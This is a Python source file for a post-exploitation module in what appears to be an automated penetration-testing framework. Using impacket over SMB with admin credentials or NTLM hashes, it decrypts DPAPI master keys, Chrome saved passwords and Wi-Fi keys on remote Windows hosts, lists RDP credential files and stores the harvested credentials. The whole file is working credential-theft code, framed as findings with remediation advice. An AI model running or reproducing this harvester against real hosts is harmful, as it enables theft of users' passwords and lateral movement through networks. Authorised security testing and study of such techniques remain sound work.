"""DPAPI credential extraction — Chrome passwords, Wi-Fi keys, RDP credentials.

Uses impacket to remotely access DPAPI-protected data on compromised
Windows hosts.  Extracts master keys using the user's NTLM hash, then
decrypts Chrome Login Data, Wi-Fi profiles, and RDP saved credentials.

When the impacket dpapi module is unavailable, falls back to reading
and reporting the existence of credential files as informational findings.
"""

from __future__ import annotations

import asyncio
import contextlib
import logging
import os
import re
import tempfile
from typing import TYPE_CHECKING, Any

from pacdoor.core.models import (
    Credential,
    CredentialType,
    Evidence,
    ExploitSafety,
    Finding,
    Phase,
    Severity,
)
from pacdoor.modules.base import BaseModule

if TYPE_CHECKING:
    from pacdoor.modules.base import ModuleContext

log = logging.getLogger(__name__)

# ── Lazy imports ─────────────────────────────────────────────────────

_impacket_available: bool | None = None
_dpapi_available: bool | None = None


def _ensure_impacket() -> bool:
    global _impacket_available  # noqa: PLW0603
    if _impacket_available is not None:
        return _impacket_available
    try:
        import impacket.smbconnection  # type: ignore[import-untyped]  # noqa: F401
        _impacket_available = True
    except ImportError:
        log.debug("impacket not installed — DPAPI extraction unavailable")
        _impacket_available = False
    return _impacket_available


def _ensure_dpapi() -> bool:
    global _dpapi_available  # noqa: PLW0603
    if _dpapi_available is not None:
        return _dpapi_available
    try:
        from impacket.dpapi import (  # type: ignore[import-untyped]  # noqa: F401
            DPAPI_BLOB,
            MasterKey,
            MasterKeyFile,
        )
        _dpapi_available = True
    except ImportError:
        log.debug("impacket.dpapi not available — will report file existence only")
        _dpapi_available = False
    return _dpapi_available


# ── Remote paths ─────────────────────────────────────────────────────

# DPAPI master keys
_PROTECT_PATH = "Users/{user}/AppData/Roaming/Microsoft/Protect"

# Chrome Login Data
_CHROME_LOGIN_DATA = (
    "Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Login Data"
)
_CHROME_LOCAL_STATE = (
    "Users/{user}/AppData/Local/Google/Chrome/User Data/Local State"
)

# Wi-Fi profiles
_WIFI_PROFILES_PATH = "ProgramData/Microsoft/Wlansvc/Profiles/Interfaces"

# RDP saved credentials
_RDP_CRED_PATH = "Users/{user}/AppData/Local/Microsoft/Credentials"


# ── SMB helpers (synchronous) ────────────────────────────────────────

def _connect_smb(
    ip: str,
    username: str,
    password: str,
    domain: str = "",
    ntlm_hash: str | None = None,
) -> Any | None:
    """Establish SMB connection to the target's C$ share."""
    try:
        from impacket.smbconnection import SMBConnection  # type: ignore[import-untyped]

        conn = SMBConnection(ip, ip, sess_port=445)
        conn.negotiateSession()

        if ntlm_hash:
            lm, nt = "", ntlm_hash
            if ":" in ntlm_hash:
                lm, nt = ntlm_hash.split(":", 1)
            conn.login(username, "", domain, lmhash=lm, nthash=nt)
        else:
            conn.login(username, password, domain)

        return conn
    except Exception as e:
        log.debug("DPAPI: SMB connection to %s failed: %s", ip, e)
        return None


def _list_users(conn: Any) -> list[str]:
    """List user profile directories on the target."""
    users: list[str] = []
    try:
        entries = conn.listPath("C$", "Users/*")
        skip = {
            ".", "..", "Public", "Default", "Default User",
            "All Users", "desktop.ini",
        }
        for entry in entries:
            name = entry.get_longname()
            if name not in skip and entry.is_directory():
                users.append(name)
    except Exception as e:
        log.debug("DPAPI: failed to list user profiles: %s", e)
    return users


def _read_remote_file(conn: Any, share: str, path: str) -> bytes | None:
    """Read a file from a remote SMB share. Returns bytes or None."""
    try:
        from io import BytesIO
        buf = BytesIO()
        conn.getFile(share, path, buf.write)
        return buf.getvalue()
    except Exception:
        return None


def _list_remote_dir(conn: Any, share: str, path: str) -> list[tuple[str, bool]]:
    """List files in a remote directory. Returns (name, is_dir) tuples."""
    results: list[tuple[str, bool]] = []
    try:
        entries = conn.listPath(share, path + "/*")
        for entry in entries:
            name = entry.get_longname()
            if name not in (".", ".."):
                results.append((name, entry.is_directory()))
    except Exception:
        pass
    return results


def _disconnect_smb(conn: Any) -> None:
    """Close SMB connection."""
    with contextlib.suppress(Exception):
        conn.close()


# ── DPAPI decryption helpers (synchronous) ───────────────────────────

def _find_master_keys(
    conn: Any,
    user: str,
) -> list[tuple[str, bytes]]:
    """Find and read DPAPI master key files for a user.

    Returns list of (sid, master_key_data) tuples.
    """
    master_keys: list[tuple[str, bytes]] = []
    protect_path = _PROTECT_PATH.format(user=user)

    # List SID directories under Protect/
    sid_dirs = _list_remote_dir(conn, "C$", protect_path)
    for sid_name, is_dir in sid_dirs:
        if not is_dir or not sid_name.startswith("S-1-"):
            continue

        # List master key files in the SID directory
        sid_path = f"{protect_path}/{sid_name}"
        mk_files = _list_remote_dir(conn, "C$", sid_path)
        for mk_name, mk_is_dir in mk_files:
            if mk_is_dir or mk_name in ("Preferred",):
                continue
            # Master key files are GUIDs
            if len(mk_name) == 36 and mk_name.count("-") == 4:
                mk_data = _read_remote_file(
                    conn, "C$", f"{sid_path}/{mk_name}",
                )
                if mk_data:
                    master_keys.append((sid_name, mk_data))

    return master_keys


def _decrypt_master_key(
    mk_data: bytes,
    sid: str,
    ntlm_hash: str,
) -> bytes | None:
    """Decrypt a DPAPI master key using the user's NTLM hash.

    Returns the decrypted master key bytes, or None on failure.
    """
    try:
        from impacket.dpapi import MasterKeyFile  # type: ignore[import-untyped]

        mkf = MasterKeyFile(mk_data)
        mk = mkf["MasterKey"]

        # Derive the key from the NTLM hash and SID
        # The NTLM hash is used as the user's password hash
        nt_hash = ntlm_hash
        if ":" in nt_hash:
            nt_hash = nt_hash.split(":")[1]
        nt_hash_bytes = bytes.fromhex(nt_hash)

        # Try to decrypt the master key
        decrypted = mk.decrypt(sid, nt_hash_bytes)
        if decrypted:
            return decrypted
    except Exception as e:
        log.debug("DPAPI: master key decrypt failed: %s", e)

    return None


def _extract_chrome_passwords(
    conn: Any,
    user: str,
    decrypted_keys: dict[str, bytes],
) -> list[dict[str, str]]:
    """Extract Chrome saved passwords from Login Data SQLite DB.

    Returns list of dicts with keys: url, username, password.
    """
    passwords: list[dict[str, str]] = []

    login_data_path = _CHROME_LOGIN_DATA.format(user=user)
    login_data = _read_remote_file(conn, "C$", login_data_path)
    if login_data is None:
        return passwords

    # Also need Local State for the AES encryption key (Chrome 80+)
    local_state_path = _CHROME_LOCAL_STATE.format(user=user)
    local_state_data = _read_remote_file(conn, "C$", local_state_path)

    aes_key: bytes | None = None
    if local_state_data:
        try:
            import json
            local_state = json.loads(local_state_data.decode("utf-8", errors="replace"))
            encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key", "")
            if encrypted_key_b64:
                import base64
                encrypted_key = base64.b64decode(encrypted_key_b64)
                # Strip "DPAPI" prefix (5 bytes)
                if encrypted_key[:5] == b"DPAPI":
                    dpapi_blob = encrypted_key[5:]
                    aes_key = _decrypt_dpapi_blob(dpapi_blob, decrypted_keys)
        except Exception as e:
            log.debug("DPAPI: Chrome Local State parse failed: %s", e)

    # Parse the SQLite Login Data file
    try:
        import sqlite3
        # Write to temp file (sqlite3 needs a file path)
        with tempfile.NamedTemporaryFile(
            suffix=".db", delete=False,
        ) as tmp:
            tmp.write(login_data)
            tmp_path = tmp.name

        try:
            db = sqlite3.connect(tmp_path)
            cursor = db.execute(
                "SELECT origin_url, username_value, password_value "
                "FROM logins WHERE length(password_value) > 0"
            )

            for url, username, encrypted_password in cursor.fetchall():
                if not encrypted_password:
                    continue

                plaintext = None
                encrypted_bytes = bytes(encrypted_password)

                # Chrome 80+ uses AES-GCM with the DPAPI-protected key
                if encrypted_bytes[:3] == b"v10" or encrypted_bytes[:3] == b"v11":
                    if aes_key:
                        plaintext = _chrome_aes_decrypt(
                            encrypted_bytes, aes_key,
                        )
                else:
                    # Older Chrome versions use DPAPI directly
                    plaintext_bytes = _decrypt_dpapi_blob(
                        encrypted_bytes, decrypted_keys,
                    )
                    if plaintext_bytes:
                        plaintext = plaintext_bytes.decode(
                            "utf-8", errors="replace",
                        )

                if plaintext and username:
                    passwords.append({
                        "url": url,
                        "username": username,
                        "password": plaintext,
                    })

            db.close()
        finally:
            os.unlink(tmp_path)
    except ImportError:
        log.debug("sqlite3 not available — cannot parse Chrome Login Data")
    except Exception as e:
        log.debug("DPAPI: Chrome password extraction failed: %s", e)

    return passwords


def _chrome_aes_decrypt(encrypted: bytes, key: bytes) -> str | None:
    """Decrypt a Chrome 80+ AES-GCM encrypted password."""
    try:
        # Format: v10/v11 (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
        nonce = encrypted[3:15]
        ciphertext_and_tag = encrypted[15:]

        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            aesgcm = AESGCM(key)
            plaintext = aesgcm.decrypt(nonce, ciphertext_and_tag, None)
            return plaintext.decode("utf-8", errors="replace")
        except ImportError:
            pass

        # Fallback: pycryptodome
        try:
            from Crypto.Cipher import AES as CryptoAES  # type: ignore[import-untyped]
            cipher = CryptoAES.new(key, CryptoAES.MODE_GCM, nonce=nonce)
            # Last 16 bytes are the tag
            ciphertext = ciphertext_and_tag[:-16]
            tag = ciphertext_and_tag[-16:]
            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
            return plaintext.decode("utf-8", errors="replace")
        except ImportError:
            pass

    except Exception as e:
        log.debug("Chrome AES-GCM decrypt failed: %s", e)

    return None


def _decrypt_dpapi_blob(
    blob_data: bytes,
    decrypted_keys: dict[str, bytes],
) -> bytes | None:
    """Decrypt a DPAPI blob using available decrypted master keys."""
    try:
        from impacket.dpapi import DPAPI_BLOB  # type: ignore[import-untyped]

        blob = DPAPI_BLOB(blob_data)

        # Try each decrypted master key
        for _mk_guid, mk_bytes in decrypted_keys.items():
            try:
                decrypted = blob.decrypt(mk_bytes)
                if decrypted:
                    return decrypted
            except Exception:
                continue
    except ImportError:
        pass
    except Exception as e:
        log.debug("DPAPI blob decrypt failed: %s", e)

    return None


def _extract_wifi_passwords(
    conn: Any,
) -> list[dict[str, str]]:
    """Extract Wi-Fi profile names (passwords require DPAPI/SYSTEM key).

    Returns list of dicts with keys: interface, profile_name, ssid.
    """
    profiles: list[dict[str, str]] = []

    interfaces = _list_remote_dir(conn, "C$", _WIFI_PROFILES_PATH)
    for iface_name, is_dir in interfaces:
        if not is_dir:
            continue

        iface_path = f"{_WIFI_PROFILES_PATH}/{iface_name}"
        xml_files = _list_remote_dir(conn, "C$", iface_path)

        for xml_name, xml_is_dir in xml_files:
            if xml_is_dir or not xml_name.endswith(".xml"):
                continue

            xml_data = _read_remote_file(
                conn, "C$", f"{iface_path}/{xml_name}",
            )
            if xml_data is None:
                continue

            xml_text = xml_data.decode("utf-8", errors="replace")

            # Extract SSID name from XML
            ssid_match = re.search(r"<name>([^<]+)</name>", xml_text)
            ssid = ssid_match.group(1) if ssid_match else xml_name

            # Check for key material
            key_match = re.search(
                r"<keyMaterial>([^<]+)</keyMaterial>", xml_text,
            )

            profile_info: dict[str, str] = {
                "interface": iface_name,
                "profile_name": xml_name,
                "ssid": ssid,
            }

            if key_match:
                profile_info["key_material"] = key_match.group(1)
                # If it's plaintext (not DPAPI blob), include it
                key_val = key_match.group(1)
                if not key_val.startswith("01000000"):  # DPAPI blob marker
                    profile_info["password"] = key_val

            profiles.append(profile_info)

    return profiles


def _find_rdp_credentials(
    conn: Any,
    user: str,
) -> list[dict[str, str]]:
    """Find RDP saved credential files (Credentials vault).

    Returns list of dicts with keys: file_name, file_path, size.
    """
    cred_files: list[dict[str, str]] = []

    cred_path = _RDP_CRED_PATH.format(user=user)
    entries = _list_remote_dir(conn, "C$", cred_path)

    for name, is_dir in entries:
        if is_dir:
            continue
        full_path = f"{cred_path}/{name}"
        data = _read_remote_file(conn, "C$", full_path)
        cred_files.append({
            "file_name": name,
            "file_path": full_path,
            "size": str(len(data)) if data else "0",
        })

    return cred_files


# ── Module ───────────────────────────────────────────────────────────


class DpapiExtractModule(BaseModule):
    """DPAPI credential extraction — Chrome passwords, Wi-Fi, RDP."""

    name = "post.dpapi_extract"
    description = "Extract DPAPI-protected credentials (Chrome, Wi-Fi, RDP)"
    phase = Phase.POST_EXPLOIT
    attack_technique_ids = ["T1555.003", "T1552"]
    required_facts = ["credential.admin"]
    produced_facts = ["credential.valid"]
    safety = ExploitSafety.MODERATE

    async def check(self, ctx: ModuleContext) -> bool:
        """Verify impacket is available and admin credentials exist."""
        if not _ensure_impacket():
            return False
        return await super().check(ctx)

    async def run(self, ctx: ModuleContext) -> list[Finding]:
        findings: list[Finding] = []

        if not _ensure_impacket():
            return findings

        has_dpapi = _ensure_dpapi()

        admin_creds = await ctx.facts.get_all("credential.admin")
        seen_hosts: set[str] = set()

        for fact in admin_creds:
            host_id = fact.host_id
            if host_id is None or host_id in seen_hosts:
                continue
            seen_hosts.add(host_id)

            ip = await self.resolve_ip(ctx, host_id)
            if ip is None:
                continue

            # Only target Windows hosts with SMB
            has_smb = bool(await ctx.facts.get_for_host("service.smb", host_id))
            if not has_smb:
                continue

            cred = fact.value
            username = (
                cred.username if hasattr(cred, "username")
                else str(cred.get("username", ""))
            )
            password = (
                cred.value if hasattr(cred, "value")
                else str(cred.get("value", ""))
            )
            domain = (
                cred.domain if hasattr(cred, "domain")
                else str(cred.get("domain", ""))
            )

            # Determine auth method
            ntlm_hash: str | None = None
            cred_type = (
                str(cred.cred_type) if hasattr(cred, "cred_type")
                else str(cred.get("cred_type", ""))
            )
            if "ntlm" in cred_type.lower():
                ntlm_hash = password
                password = ""

            await ctx.rate_limiter.acquire()

            conn = await asyncio.to_thread(
                _connect_smb, ip, username, password, domain or "", ntlm_hash,
            )
            if conn is None:
                continue

            try:
                await self._extract_from_host(
                    ctx, findings, conn, host_id, ip, username,
                    ntlm_hash or password, domain or "", has_dpapi,
                )
            finally:
                await asyncio.to_thread(_disconnect_smb, conn)

        return findings

    async def _extract_from_host(
        self,
        ctx: ModuleContext,
        findings: list[Finding],
        conn: Any,
        host_id: str,
        ip: str,
        auth_username: str,
        auth_secret: str,
        domain: str,
        has_dpapi: bool,
    ) -> None:
        """Extract DPAPI-protected credentials from a single host."""

        # List user profiles on the target
        users = await asyncio.to_thread(_list_users, conn)
        if not users:
            log.debug("DPAPI: no user profiles found on %s", ip)
            return

        for user in users:
            # ── Master key discovery ─────────────────────────────────
            master_keys = await asyncio.to_thread(
                _find_master_keys, conn, user,
            )

            decrypted_keys: dict[str, bytes] = {}

            if master_keys and has_dpapi and auth_secret:
                # Try to decrypt master keys with the NTLM hash
                for sid, mk_data in master_keys:
                    mk_decrypted = await asyncio.to_thread(
                        _decrypt_master_key, mk_data, sid, auth_secret,
                    )
                    if mk_decrypted:
                        decrypted_keys[sid] = mk_decrypted

            # ── Chrome passwords ─────────────────────────────────────
            if decrypted_keys:
                chrome_passwords = await asyncio.to_thread(
                    _extract_chrome_passwords, conn, user, decrypted_keys,
                )

                if chrome_passwords:
                    pw_lines = "\n".join(
                        f"  - {p['url']}: {p['username']}"
                        for p in chrome_passwords[:30]
                    )
                    suffix = (
                        f"\n  ... and {len(chrome_passwords) - 30} more"
                        if len(chrome_passwords) > 30
                        else ""
                    )

                    findings.append(Finding(
                        title=(
                            f"Chrome passwords extracted from {ip} "
                            f"(user: {user})"
                        ),
                        description=(
                            f"Decrypted {len(chrome_passwords)} saved "
                            f"password(s) from Chrome on {ip} for user "
                            f"'{user}'. Chrome passwords are protected by "
                            f"DPAPI, which was decrypted using the user's "
                            f"NTLM hash."
                        ),
                        severity=Severity.CRITICAL,
                        host_id=host_id,
                        module_name=self.name,
                        attack_technique_ids=["T1555.003"],
                        evidence=[
                            Evidence(
                                kind="chrome_passwords",
                                data=f"Chrome passwords from {ip} ({user}):\n{pw_lines}{suffix}",
                            ),
                            Evidence(kind="profile_user", data=user),
                        ],
                        remediation=(
                            "Enforce endpoint protection that prevents "
                            "credential extraction. Use a password manager "
                            "with hardware-backed encryption instead of "
                            "browser-saved passwords. Enable Credential Guard "
                            "on Windows 10+ to protect DPAPI master keys."
                        ),
                        verified=True,
                    ))

                    # Store each extracted credential
                    for pw in chrome_passwords:
                        new_cred = Credential(
                            host_id=host_id,
                            username=pw["username"],
                            cred_type=CredentialType.PASSWORD,
                            value=pw["password"],
                            domain=None,
                            source_module=self.name,
                            valid=False,  # Not validated against target systems
                        )
                        await ctx.facts.add(
                            "credential.valid", new_cred, self.name,
                            host_id=host_id,
                        )
                        if ctx.db is not None:
                            await ctx.db.insert_credential(new_cred)
            else:
                # No decrypted keys — check if Chrome Login Data exists
                login_path = _CHROME_LOGIN_DATA.format(user=user)
                login_data = await asyncio.to_thread(
                    _read_remote_file, conn, "C$", login_path,
                )
                if login_data and len(login_data) > 0:
                    findings.append(Finding(
                        title=(
                            f"Chrome Login Data found on {ip} "
                            f"(user: {user}) — decryption unavailable"
                        ),
                        description=(
                            f"Found Chrome Login Data file for user "
                            f"'{user}' on {ip} ({len(login_data)} bytes). "
                            f"The file contains saved passwords but could not "
                            f"be decrypted (DPAPI master key decryption "
                            f"requires the user's NTLM hash or impacket.dpapi)."
                        ),
                        severity=Severity.MEDIUM,
                        host_id=host_id,
                        module_name=self.name,
                        attack_technique_ids=["T1555.003"],
                        evidence=[
                            Evidence(kind="chrome_login_data", data=login_path),
                            Evidence(
                                kind="file_size",
                                data=f"{len(login_data)} bytes",
                            ),
                            Evidence(kind="profile_user", data=user),
                        ],
                        remediation=(
                            "Remove saved passwords from Chrome. Use a "
                            "dedicated password manager instead."
                        ),
                    ))

            # ── Wi-Fi profiles ───────────────────────────────────────
            if user == users[0]:  # Only scan Wi-Fi once per host
                wifi_profiles = await asyncio.to_thread(
                    _extract_wifi_passwords, conn,
                )

                if wifi_profiles:
                    wifi_lines = "\n".join(
                        f"  - SSID: {p['ssid']}"
                        + (f" (password: {p['password'][:4]}...)"
                           if "password" in p else "")
                        for p in wifi_profiles[:20]
                    )

                    has_cleartext = any("password" in p for p in wifi_profiles)
                    severity = Severity.HIGH if has_cleartext else Severity.MEDIUM

                    findings.append(Finding(
                        title=f"Wi-Fi profiles found on {ip}",
                        description=(
                            f"Found {len(wifi_profiles)} Wi-Fi profile(s) "
                            f"on {ip}. "
                            + (
                                "Some profiles contain cleartext passwords. "
                                if has_cleartext
                                else "Passwords are DPAPI-encrypted. "
                            )
                            + "Wi-Fi credentials may allow access to "
                            "internal wireless networks."
                        ),
                        severity=severity,
                        host_id=host_id,
                        module_name=self.name,
                        attack_technique_ids=["T1552"],
                        evidence=[
                            Evidence(
                                kind="wifi_profiles",
                                data=f"Wi-Fi profiles on {ip}:\n{wifi_lines}",
                            ),
                        ],
                        remediation=(
                            "Use WPA3-Enterprise with certificate-based "
                            "authentication (EAP-TLS) instead of "
                            "pre-shared keys. Segment Wi-Fi networks "
                            "from critical infrastructure."
                        ),
                    ))

                    # Store cleartext Wi-Fi passwords as credentials
                    for p in wifi_profiles:
                        if "password" in p:
                            wifi_cred = Credential(
                                host_id=host_id,
                                username=f"wifi:{p['ssid']}",
                                cred_type=CredentialType.PASSWORD,
                                value=p["password"],
                                source_module=self.name,
                                valid=True,
                            )
                            await ctx.facts.add(
                                "credential.valid", wifi_cred, self.name,
                                host_id=host_id,
                            )
                            if ctx.db is not None:
                                await ctx.db.insert_credential(wifi_cred)

            # ── RDP saved credentials ────────────────────────────────
            rdp_creds = await asyncio.to_thread(
                _find_rdp_credentials, conn, user,
            )

            if rdp_creds:
                rdp_lines = "\n".join(
                    f"  - {c['file_name']} ({c['size']} bytes)"
                    for c in rdp_creds
                )
                findings.append(Finding(
                    title=(
                        f"RDP saved credentials found on {ip} "
                        f"(user: {user})"
                    ),
                    description=(
                        f"Found {len(rdp_creds)} RDP saved credential "
                        f"file(s) for user '{user}' on {ip}. These "
                        f"DPAPI-encrypted files may contain saved RDP "
                        f"passwords for remote servers."
                    ),
                    severity=Severity.MEDIUM,
                    host_id=host_id,
                    module_name=self.name,
                    attack_technique_ids=["T1552"],
                    evidence=[
                        Evidence(
                            kind="rdp_credential_files",
                            data=f"RDP credential files on {ip} ({user}):\n{rdp_lines}",
                        ),
                        Evidence(kind="profile_user", data=user),
                    ],
                    remediation=(
                        "Do not save RDP credentials. Use a privileged "
                        "access management (PAM) solution for RDP sessions. "
                        "Enable Credential Guard to protect DPAPI secrets."
                    ),
                ))
